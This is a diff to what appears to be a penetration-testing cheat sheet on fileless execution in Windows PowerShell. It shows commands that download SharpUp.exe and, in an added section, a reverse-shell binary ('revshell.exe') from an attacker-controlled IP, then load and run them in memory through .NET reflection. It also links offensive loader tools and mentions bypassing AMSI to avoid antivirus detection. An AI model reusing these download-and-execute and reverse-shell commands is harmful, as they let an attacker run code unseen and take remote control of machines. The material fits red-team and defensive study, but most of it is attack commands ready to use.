@@ -176,7 +176,8 @@ In addition, with PowerShell, we can also download and execute straight into mem
 -----------------------------------------------------------------------------------------------------------------------------------------------
 
 => PowerSharpPack is a tool with many useful offensive CSharp Projects (mostly PEs) wraped into one PowerShell script that can be remotely loaded into memory for easy usage.
-   + https://github.com/S3cur3Th1sSh1t/PowerSharpPack
+
++ https://github.com/S3cur3Th1sSh1t/PowerSharpPack
    
 => The PowerShell script 'PowerLoader.ps1' builds script block which safely loads into-memory remote PowerShell script, .NET assemblies, and shellcodes.
    + https://github.com/tmenochet/PowerExec/blob/master/PowerLoader.ps1
@@ -191,20 +192,25 @@ Keep in mind that to avoid AV detection it will necessary to bypass the AMSI (Re
 -------------------------------------------------------------------------------------------
 
 PoC with the tool "SharUP.exe" (C# - SharpUp.csproj)
-
+- - - - - - - - - - - - - - - - - - - - - - - - - - -
 PS C:\temp> $PEtoload = (New-Object System.Net.WebClient).DownloadData('http://192.168.13.154:8081/SharpUp.exe')
 PS C:\temp> $assembly = [System.Reflection.Assembly]::Load($PEtoload);
 PS C:\temp> $entryPointMethod = $assembly.GetType('SharpUp.Program', [Reflection.BindingFlags] 'Public, NonPublic').GetMethod('Main', [Reflection.BindingFlags] 'Static, Public, NonPublic');
 PS C:\temp> $entryPointMethod.Invoke($null, (, [string[]] ('audit', '')));
 
 === SharpUp: Running Privilege Escalation Checks ===
-
 [*] Already in high integrity, no need to privesc!
 [*] Audit mode: running an additional 0 check(s).
 [*] Note: Running audit mode in high integrity will yield a large number of false positives.
 [-] Not vulnerable to any of the 0 checked modules.
-
 [*] Completed Privesc Checks in 0 seconds
+
+
+PoC with a reverseshell "revshell.exe" (C#)
+- - - - - - - - - - - - - - - - - - - - - - - - - - -
+$data = (New-Object System.Net.WebClient).DownloadData('http://192.168.13.154:8081/revshell.exe')
+$assem = [System.Reflection.Assembly]::Load($data)
+[rev.Program]::Main("".Split())
 
 
 2.1.2 Manually download and execute a .NET DLL straight into memory using PowerShell
